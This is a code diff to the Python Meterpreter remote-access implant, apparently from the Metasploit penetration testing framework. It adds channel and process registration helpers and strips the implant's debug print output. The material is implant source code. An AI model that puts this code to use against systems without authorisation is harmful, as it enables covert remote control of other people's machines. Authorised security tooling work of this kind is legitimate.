@@ -192,6 +192,20 @@ class PythonMeterpreter(object):
 		if has_windll:
 			self.register_function(func)
 
+	def add_channel(self, channel):
+		idx = 0
+		while idx in self.channels:
+			idx += 1
+		self.channels[idx] = channel
+		return idx
+
+	def add_process(self, process):
+		idx = 0
+		while idx in self.processes:
+			idx += 1
+		self.processes[idx] = process
+		return idx
+
 	def run(self):
 		while self.running:
 			if len(select.select([self.socket], [], [], 0)[0]):
@@ -203,10 +217,8 @@ class PythonMeterpreter(object):
 				request = ''
 				while len(request) < req_length:
 					request += self.socket.recv(4096)
-				print('[+] received ' + str(len(request)) + ' bytes')
 				response = self.create_response(request)
 				self.socket.send(response)
-				print('[+] sent ' + str(len(response)) + ' bytes')
 			else:
 				channels_for_removal = []
 				channel_ids = self.channels.keys() # iterate over the keys because self.channels could be modified if one is closed
@@ -241,7 +253,6 @@ class PythonMeterpreter(object):
 						pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
 						pkt  = struct.pack('>I', len(pkt) + 4) + pkt
 						self.socket.send(pkt)
-						print('[+] sent ' + str(len(pkt)) + ' bytes')
 
 	def handle_dead_resource_channel(self, channel_id):
 		del self.channels[channel_id]
@@ -253,7 +264,6 @@ class PythonMeterpreter(object):
 		pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
 		pkt  = struct.pack('>I', len(pkt) + 4) + pkt
 		self.socket.send(pkt)
-		print('[+] sent ' + str(len(pkt)) + ' bytes')
 
 	def _core_loadlib(self, request, response):
 		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
@@ -331,6 +341,7 @@ class PythonMeterpreter(object):
 		if channel_id not in self.channels:
 			return ERROR_FAILURE, response
 		channel = self.channels[channel_id]
+		data = ''
 		if isinstance(channel, file):
 			data = channel.read(length)
 		elif isinstance(channel, STDProcess):
@@ -380,22 +391,17 @@ class PythonMeterpreter(object):
 		reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
 		resp += tlv_pack(reqid_tlv)
 
-		print("[*] running method: " + method_tlv['value'])
 		if method_tlv['value'] in self.extension_functions:
 			handler = self.extension_functions[method_tlv['value']]
 			try:
 				result, resp = handler(request, resp)
 			except Exception, err:
-				print("[-] method: " + method_tlv['value'] + " encountered an exception: " + repr(err))
 				result = ERROR_FAILURE
 		else:
 			result = ERROR_FAILURE
-		if result == ERROR_FAILURE:
-			print("[*] method: " + method_tlv['value'] + " failed")
-
 		resp += tlv_pack(TLV_TYPE_RESULT, result)
 		resp = struct.pack('>I', len(resp) + 4) + resp
 		return resp
-print("[+] starting meterpreter")
+
 met = PythonMeterpreter(s)
 met.run()
